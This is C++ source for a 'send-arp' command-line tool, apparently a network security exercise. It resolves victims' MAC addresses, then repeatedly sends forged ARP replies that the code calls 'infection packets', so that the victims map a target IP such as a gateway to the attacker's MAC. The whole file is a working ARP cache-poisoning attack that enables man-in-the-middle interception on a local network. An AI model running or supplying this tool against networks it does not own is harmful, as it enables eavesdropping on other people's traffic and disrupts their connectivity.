#include <arpa/inet.h>
#include <net/if.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cerrno>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

#include "arphdr.h"
#include "ethhdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct Flow {
	Ip sender_ip;
	Ip target_ip;
	Mac sender_mac;
};

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool get_attacker_mac(const char* ifname, Mac* mac) {
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock == -1) {
		perror("socket");
		return false;
	}

	ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

	if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
		perror("ioctl(SIOCGIFHWADDR)");
		close(sock);
		return false;
	}

	*mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
	close(sock);
	return true;
}

bool get_attacker_ip(const char* ifname, Ip* ip) {
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock == -1) {
		perror("socket");
		return false;
	}

	ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

	if (ioctl(sock, SIOCGIFADDR, &ifr) == -1) {
		perror("ioctl(SIOCGIFADDR)");
		close(sock);
		return false;
	}

	sockaddr_in* sin = reinterpret_cast<sockaddr_in*>(&ifr.ifr_addr);
	*ip = Ip(ntohl(sin->sin_addr.s_addr));
	close(sock);
	return true;
}

EthArpPacket make_arp_request(const Mac& attacker_mac, const Ip& attacker_ip, const Ip& sender_ip) {
	EthArpPacket packet {};
	packet.eth_.dmac_ = Mac::broadcastMac();
	packet.eth_.smac_ = attacker_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = attacker_mac;
	packet.arp_.sip_ = htonl(attacker_ip);
	packet.arp_.tmac_ = Mac::nullMac();
	packet.arp_.tip_ = htonl(sender_ip);
	return packet;
}

EthArpPacket make_infection_packet(const Mac& attacker_mac, const Mac& sender_mac, const Ip& sender_ip, const Ip& target_ip) {
	EthArpPacket packet {};
	packet.eth_.dmac_ = sender_mac;
	packet.eth_.smac_ = attacker_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = attacker_mac;
	packet.arp_.sip_ = htonl(target_ip);
	packet.arp_.tmac_ = sender_mac;
	packet.arp_.tip_ = htonl(sender_ip);
	return packet;
}

bool send_packet(pcap_t* pcap, const EthArpPacket& packet) {
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket failed: %s\n", pcap_geterr(pcap));
		return false;
	}
	return true;
}

bool resolve_sender_mac(pcap_t* pcap, const Mac& attacker_mac, const Ip& attacker_ip, Flow* flow) {
	EthArpPacket request = make_arp_request(attacker_mac, attacker_ip, flow->sender_ip);
	if (!send_packet(pcap, request)) {
		return false;
	}

	while (true) {
		pcap_pkthdr* header = nullptr;
		const u_char* packet = nullptr;

		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) {
			continue;
		}
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap));
			return false;
		}
		if (header->caplen < sizeof(EthArpPacket)) {
			continue;
		}

		const EthArpPacket* recv = reinterpret_cast<const EthArpPacket*>(packet);
		if (ntohs(recv->eth_.type_) != EthHdr::Arp) {
			continue;
		}
		if (ntohs(recv->arp_.op_) != ArpHdr::Reply) {
			continue;
		}
		if (!(Ip(ntohl(recv->arp_.sip_)) == flow->sender_ip)) {
			continue;
		}
		if (!(Ip(ntohl(recv->arp_.tip_)) == attacker_ip)) {
			continue;
		}

		flow->sender_mac = recv->arp_.smac_;
		return true;
	}
}

int main(int argc, char* argv[]) {
	if (argc < 4 || ((argc - 2) % 2) != 0) {
		usage();
		return EXIT_FAILURE;
	}

	const char* dev = argv[1];
	std::vector<Flow> flows;
	for (int i = 2; i < argc; i += 2) {
		flows.push_back({Ip(argv[i]), Ip(argv[i + 1]), Mac()});
	}

	Mac attacker_mac;
	Ip attacker_ip;
	if (!get_attacker_mac(dev, &attacker_mac) || !get_attacker_ip(dev, &attacker_ip)) {
		return EXIT_FAILURE;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}


	printf("attacker mac: %s\n", std::string(attacker_mac).c_str());
	printf("attacker ip: %s\n", std::string(attacker_ip).c_str());


	for (Flow& flow : flows) {
		if (!resolve_sender_mac(pcap, attacker_mac, attacker_ip, &flow)) {
			fprintf(stderr, "failed to resolve sender mac for %s\n", std::string(flow.sender_ip).c_str());
			pcap_close(pcap);
			return EXIT_FAILURE;
		}
		printf("Resolved %s -> %s\n", std::string(flow.sender_ip).c_str(), std::string(flow.sender_mac).c_str());
	}

	printf("\nStarting ARP infection... Press Ctrl+C to stop.\n");


	while (true) {
		for (Flow& flow : flows) {
			EthArpPacket infection = make_infection_packet(attacker_mac, flow.sender_mac, flow.sender_ip, flow.target_ip);

			if (!send_packet(pcap, infection)) {
				fprintf(stderr, "Failed to send infection packet to %s\n", std::string(flow.sender_ip).c_str());
			} else {
				printf("[+] Sent infection packet to %s (Target: %s)\n", 
					std::string(flow.sender_ip).c_str(), std::string(flow.target_ip).c_str());
			}
		}


		sleep(2);
	}

	pcap_close(pcap);
	return EXIT_SUCCESS;
}
